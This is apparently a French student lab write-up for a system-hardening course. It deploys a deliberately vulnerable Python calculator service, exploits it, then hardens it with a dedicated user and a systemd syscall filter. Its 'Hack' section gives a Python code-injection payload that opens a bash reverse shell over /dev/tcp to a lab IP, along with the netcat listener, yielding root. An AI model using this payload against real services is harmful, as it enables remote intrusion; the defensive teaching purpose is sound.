# Part IV : My shitty app

## 1. Test

🌞 **Téléchargez l'app Python dans votre VM**

```bash
sudo curl -sSL -o /opt/calc.py https://gitlab.com/it4lik/m1-hardening-2024/-/raw/main/tp/2/calc.py
```

🌞 **Lancer l'application dans votre VM**

```bash
python3 /opt/calc.py
```

- Ouvrir le port du firewall :

```bash
sudo firewall-cmd --add-port=13337/tcp --permanent
sudo firewall-cmd --reload
```

- Tester depuis une autre machine avec `nc` :

```bash
nc 192.168.1.195 13337

Hello3+3
6
```

## 2. Création de service

🌞 **Créer un service `calculatrice.service`**

```bash
sudo vim /etc/systemd/system/calculatrice.service
```

Contenu du service :

```ini
[Unit]
Description=Super calculatrice :D

[Service]
ExecStartPre=/usr/bin/firewall-cmd --add-port=13337/tcp
ExecStartPre=/usr/bin/firewall-cmd --add-port=13337/tcp --permanent
ExecStart=/usr/bin/python3 /opt/calc.py
ExecStopPost=/usr/bin/firewall-cmd --remove-port=13337/tcp
ExecStopPost=/usr/bin/firewall-cmd --remove-port=13337/tcp --permanent
Restart=always

[Install]
WantedBy=multi-user.target
```

🌞 **Démarrer et vérifier le service :**

```bash
sudo systemctl daemon-reload
sudo systemctl start calculatrice
sudo systemctl status calculatrice
```

Tester de nouveau avec `nc` :

```bash
nc 192.168.1.195 13337

Hello4+4
8
```

## 3. Hack

🌞 **Injection de commande :**

```bash
nc 192.168.1.195 13337

Hello__import__("os").system("bash -i >& /dev/tcp/192.168.1.150/9999 0>&1")
```

- Listener sur la machine attaquante (`192.168.1.150`) :

```bash
nc -lvp 9999
```

Un reverse shell en root est obtenu.

## 4. Harden

### A. Utilisateurs

🌞 **Créer un utilisateur dédié :**

```bash
sudo useradd calculatrice --shell /usr/sbin/nologin --no-create-home
sudo chown calculatrice:calculatrice /opt/calc.py
sudo chmod 500 /opt/calc.py
sudo chattr +i /opt/calc.py
```

🌞 **Modifier le service pour l'exécuter sous cet utilisateur :**

Modifier `/etc/systemd/system/calculatrice.service` :

```ini
[Service]
...
User=calculatrice
PermissionsStartOnly=true
...
```

Redémarrer le service :

```bash
sudo systemctl daemon-reload
sudo systemctl restart calculatrice
```

### B. Syscalls

🌞 **Tracer l'application en usage normal et en exploitation :**

- Usage normal : `calc_legit.scap`
- Exploitation : `calc_hacked.scap`

Comparer les syscalls pour identifier ceux nécessaires :

```bash
sudo sysdig -r calc_legit.scap | cut -d' ' -f7 | sort | uniq > legit_syscalls
sudo sysdig -r calc_hacked.scap | cut -d' ' -f7 | sort | uniq > hacked_syscalls
comm -13 legit_syscalls hacked_syscalls
```

🌞 **Limiter les syscalls autorisés :**

Modifier le service pour ajouter `SystemCallFilter=` :

```ini
[Service]
...
SystemCallFilter=accept4 access arch_prctl bind brk capget chdir close connect dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl keyctl listen lseek mmap mprotect munmap newfstatat openat prctl pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto setresuid setreuid set_robust_list setsockopt set_tid_address signaldeliver socket switch sysinfo write pread64
...
```

🌞 **Vérification finale :**

Tester à nouveau l'injection ; le reverse shell échoue désormais grâce aux restrictions mises en place.
